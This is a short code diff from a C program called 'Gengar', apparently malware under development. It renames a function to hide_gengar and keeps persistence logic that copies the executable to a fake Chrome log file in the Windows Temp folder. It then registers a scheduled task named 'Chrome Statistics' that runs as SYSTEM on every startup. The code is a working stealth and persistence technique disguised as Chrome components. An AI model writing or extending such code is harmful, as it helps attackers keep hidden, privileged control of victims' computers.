@@ -6,7 +6,7 @@
 #define TASK_NAME "Chrome Statistics"
 #define GENGAR_PATH "C:\\Windows\\Temp\\ChromeDiagnose.log"
 
-void move_gengar() {
+void hide_gengar() {
   char exe_path[1024];
   printf("Moving gengar to its path.\n");
   GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
@@ -16,7 +16,7 @@ void move_gengar() {
 void persist() {
   char cmd[1024];
   printf("Persisting Gengar.\n");
-  move_gengar();
+  hide_gengar();
   sprintf(cmd,
           "schtasks /Create /F /RU SYSTEM /SC ONSTART /TN \"%s\" /TR \"%s\"",
           TASK_NAME, GENGAR_PATH);
